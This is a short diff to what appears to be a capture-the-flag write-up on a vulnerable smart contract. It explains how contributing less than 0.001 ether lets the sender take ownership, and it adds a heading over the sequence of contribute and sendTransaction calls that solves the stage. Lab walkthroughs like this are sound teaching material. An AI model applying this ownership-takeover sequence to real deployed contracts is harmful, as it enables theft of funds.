@@ -29,7 +29,8 @@ the contribute function checks if the contribution is less than 0.001 ether and 
 toWei("0.001") => returns 1000000000000000
 ```
 returns the value of ether to wei, so any contribution less than '1000000000000000' will allow msg.sender to take ownership of the contract. 
-
+ 
+>order of calls to solve this stage
 ```
 contract.contribute({100})
 contract.sendTransaction({100})
